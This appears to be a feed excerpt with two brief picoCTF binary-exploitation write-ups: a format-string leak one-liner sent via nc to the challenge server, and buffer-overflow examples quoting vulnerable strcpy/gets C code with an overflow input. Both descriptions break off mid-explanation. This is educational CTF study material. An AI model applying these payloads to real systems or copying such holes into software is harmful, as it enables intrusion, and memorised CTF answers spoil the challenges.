item.title: picoCTF 2021 - Binary Exploitation
item.description: Stonks There is a format-string vulnerability. (echo 1; for i in {1..50}; do echo -n "%${i}\$08x" ; done ; echo) | nc mercury.picoctf.net 6989 There is some ASCII characters in the output, so we can convert from hex the output to read the string We find the string but we have the wrong Endianness ocip{FTC0l_I4_t5m[..SNIP..]..} With Cyberchef it is easy, simply click here to view the solution. in python3, it is more tricky:

item.title: picoCTF 2018 - Binary Exploitation
item.description: buffer-overflow-0 source: vuln.c binary: vuln The below code is vulnerable to bufferoverflow as input can be bigger then the 16 bytes buffer size void vuln(char *input){ char buf[16]; strcpy(buf, input); } ./vuln XXXXXXXXXXXXXXXXXXXX buffer-overflow-1 source: vuln.c binary: vuln The below code is vulnerable to overflow attack because gets cannot know in advance whether the size of the user input will be bigger then BUFSIZE void vuln(){ char buf[BUFSIZE]; gets(buf); } With radare2, we can deduct the size of the overflow without dumping a core:
